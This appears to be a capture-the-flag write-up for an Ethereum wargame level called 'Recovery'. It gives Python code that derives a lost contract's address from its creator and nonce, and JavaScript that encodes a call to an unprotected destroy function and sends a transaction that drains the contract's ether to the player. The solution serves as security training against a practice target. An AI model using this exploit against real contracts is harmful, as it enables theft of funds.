# Level 17 - Recovery

- Contract address generation.
- Find the address of first deployed contract (nonce 1)
- Python code to generate address:

```python
import rlp
from eth_utils import keccak, to_checksum_address, to_bytes

def mk_contract_address(sender: str, nonce: int) -> str:
    sender_bytes = to_bytes(hexstr=sender)
    raw = rlp.encode([sender_bytes, nonce])
    h = keccak(raw)
    address_bytes = h[12:]
    return to_checksum_address(address_bytes)

setup_addr = "0xb0031ad08fB469764019b1B0d8b0D1e1d824fcd3"
_addr = to_checksum_address(mk_contract_address(to_checksum_address(setup_addr), 1))
print(_addr)

```

- After finding address, generate data with following js code:

```jsx
web3.eth.abi.encodeFunctionCall({
    name:'destroy',
    type:'function',
    inputs:[{
        type:'address',
        name:'_to'
    }]}, [player])
    
// 0x00f55d9d0000000000000000000000000f1e46657b33ac30257cb1b332efb358240d951c
```

- Then, call method with `sendTransaction({from:player, to:target, data:'0x00f55d9d0000000000000000000000000f1e46657b33ac30257cb1b332efb358240d951c'})`